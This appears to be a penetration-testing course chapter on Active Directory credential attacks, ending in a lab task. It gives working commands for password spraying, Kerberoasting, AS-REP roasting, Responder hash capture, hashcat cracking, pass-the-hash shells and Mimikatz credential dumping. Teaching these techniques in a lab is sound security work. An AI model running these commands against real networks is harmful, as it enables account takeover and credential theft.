Credential attacks are the most reliable path through an Active Directory environment. Most AD compromises involve obtaining at least one credential—whether through spraying, hash cracking, or Kerberos ticket abuse—and then using that credential to gain further access.

## Password Spraying

Password spraying attempts one password against many accounts, avoiding lockouts that trigger when many passwords are tried against one account.

### Rules Before Spraying

1. Know the lockout threshold. Query it first:

```powershell
# PowerView
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
```

2. Stay at least 2 attempts below the threshold.
3. Wait longer than the observation window between rounds.
4. Use your findings to build a targeted password list (company name + year, season + year, product names).

### Spraying with CME

```sh
# Test a single password against all users
crackmapexec smb 192.168.1.10 -u users.txt -p 'Winter2024!' --continue-on-success

# Spray over a whole subnet
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Winter2024!'
```

A `[+]` result means the credential is valid. `(Pwn3d!)` means the account has local admin rights on that machine.

### Spraying with Kerbrute (Kerberos-based, quieter)

```sh
# Spray against Kerberos (no LDAP logs, often quieter)
kerbrute passwordspray -d corp.local --dc 192.168.1.10 users.txt 'Winter2024!'

# Enumerate valid usernames before spraying
kerbrute userenum -d corp.local --dc 192.168.1.10 /usr/share/wordlists/usernames.txt
```

## Kerberoasting

Any domain user can request a Kerberos service ticket (TGS) for any service principal (SPN). The ticket is encrypted with the service account's NTLM hash. You can take the ticket offline and crack it.

```sh
# Request TGS hashes for all Kerberoastable accounts (from Linux)
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 192.168.1.10 -request

# Output looks like:
# $krb5tgs$23$*svc_sql$corp.local$corp.local/svc_sql*$abcdef...
```

Save the hash to a file and crack with hashcat:

```sh
hashcat -a 0 -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

Service accounts (e.g., `svc_sql`, `svc_iis`) often have weak or old passwords—Kerberoasting is frequently productive.

## AS-REP Roasting

If an account has "Do not require Kerberos pre-authentication" enabled, anyone can request their AS-REP hash without credentials.

```sh
# From Linux
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.10

# Output:
# $krb5asrep$23$jsmith@CORP.LOCAL:abcdef...
```

Crack with hashcat:

```sh
hashcat -a 0 -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

## NTLM Hash Capture

If you can position yourself on the network, you can capture NTLM authentication hashes using Responder.

```sh
# Start Responder on your network interface
sudo responder -I eth0 -wPv
```

Responder poisons LLMNR, NBT-NS, and MDNS responses. When a machine tries to resolve a non-existent host, it broadcasts—Responder answers and captures the authentication attempt.

The captured hash looks like:

```
[SMB] NTLMv2-SSP Hash : user::CORP:randomchallenge:abcdef...:abcdef...
```

Save the NTLMv2 hash and crack with hashcat:

```sh
hashcat -a 0 -m 5600 ntlm.hash /usr/share/wordlists/rockyou.txt
```

## Pass-the-Hash

If you cannot crack the hash, you can often use it directly without knowing the plaintext password. Pass-the-Hash (PtH) works with NTLM authentication.

```sh
# Open a shell on a remote machine using an NTLM hash
impacket-psexec corp.local/administrator@192.168.1.10 -hashes :aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b

# Authenticate SMB with hash
crackmapexec smb 192.168.1.10 -u administrator -H 64f12cddaa88057e06a81b54e73b949b
```

## Dumping Credentials from Memory (Mimikatz)

On a Windows machine where you have administrator access, Mimikatz can extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory.

```powershell
# Must run as SYSTEM or administrator
privilege::debug
sekurlsa::logonpasswords

# Dump all hashes from SAM
lsadump::sam

# DCSync (from a machine with replication rights)
lsadump::dcsync /user:administrator
```

## Task

> **[Task]** In your AD lab, perform a password spray with one common password against all domain users. Then identify and Kerberoast at least one service account. Save the hash and attempt to crack it with hashcat and rockyou.txt. Record whether you obtained the plaintext password and what privileges that account has.
